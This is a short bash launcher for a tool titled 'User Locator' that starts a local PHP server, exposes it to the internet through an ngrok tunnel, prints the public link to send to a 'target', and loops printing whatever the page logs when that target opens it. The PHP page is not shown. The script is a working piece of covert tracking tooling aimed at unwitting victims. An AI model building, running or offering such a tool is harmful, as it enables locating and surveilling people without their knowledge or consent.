#! /usr/bin/bash

banner(){
printf "\n"
printf "\e[1;94m===================================\e[0m\n"
printf "\e[1;93m   ++++  User Locator  ++++\e[0m\n"
printf "\e[1;94m===================================\e[0m\n"
printf "\n"
}
process_stop(){
checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi
if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
}
dependencies(){
	command -v php > /dev/null 2>&1 || { printf >&2 "\e[1;93m[!] \e[1;91mI require php but it's not installed. Install it. Aborting.\e[0m"; exit 1; }
}
checkopened(){
	printf "\e[1;94m[*] Waiting for target to open link....\e[0m\n"
	while [ true ]
	do
		if [ -e log.log ]
		then
			data=$(cat log.log)
			printf "\e[1;93m[*] Target : $data\e[0m\n"
			rm -rf log.log
		fi
	done
}
start_server(){
process_stop
printf "\e[1;92m[*] Starting php server on port 3333 ....\e[0m\n"
fuser -k 3333/tcp > /dev/null 2>&1
php -S 127.0.0.1:3333 > /dev/null 2>&1 &
printf "\e[1;92m[*] Starting ngrok server ....\e[0m\n"
./ngrok http 3333 > /dev/null 2>&1 &
sleep 10
link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "http://[0-9a-z]*\.ngrok.io")
#printf "\e[1;92m[*] Direct link : \e[1;93m %s\e[0m\n" $link
printf "\e[1;92m[*] Direct link :\e[1;93m %s\e[0m\n" $link
checkopened
}
start_server
